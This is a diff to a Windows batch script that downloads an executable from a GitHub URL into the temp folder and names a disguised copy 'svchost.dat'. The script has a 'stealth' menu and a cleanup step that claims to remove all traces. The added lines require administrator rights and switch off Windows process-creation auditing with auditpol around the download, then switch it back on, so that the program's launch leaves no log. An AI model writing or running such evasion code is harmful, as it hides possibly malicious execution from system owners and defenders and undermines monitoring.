@@ -11,6 +11,14 @@ set "EXE_URL=https://github.com/maxyprime/panelconfig/raw/refs/heads/main/CAXVN.
 set "SETUP_EXE=%temp%\CAXVN.exe"
 set "DISGUISED_EXE=%temp%\svchost.dat"
 
+:: Check if running as admin
+net session >nul 2>&1
+if errorlevel 1 (
+    echo This script must be run as Administrator.
+    pause
+    exit /b
+)
+
 :LOGIN
 cls
 echo ==========================================
@@ -154,6 +162,9 @@ timeout /t 2 /nobreak >nul
 goto STEALTH_MENU
 
 :SETUP
+echo Disabling process creation auditing...
+auditpol /set /subcategory:"Process Creation" /success:disable >nul 2>&1
+
 echo STEP 1: Preparing download...
 timeout /t 1 >nul
 echo STEP 2: Connecting to GitHub...
@@ -165,9 +176,15 @@ if exist "%SETUP_EXE%" (
     echo Download successful.
 ) else (
     echo Failed to download EXE.
+    echo Re-enabling process creation auditing...
+    auditpol /set /subcategory:"Process Creation" /success:enable >nul 2>&1
     pause
     goto STEALTH_MENU
 )
+
+echo Re-enabling process creation auditing...
+auditpol /set /subcategory:"Process Creation" /success:enable >nul 2>&1
+
 pause
 goto STEALTH_MENU
 
@@ -218,6 +235,9 @@ ipconfig /flushdns >nul
 
 :: Clear clipboard
 echo off | clip
+
+echo Re-enabling process creation auditing...
+auditpol /set /subcategory:"Process Creation" /success:enable >nul 2>&1
 
 echo Cleanup done. All traces removed.
 pause
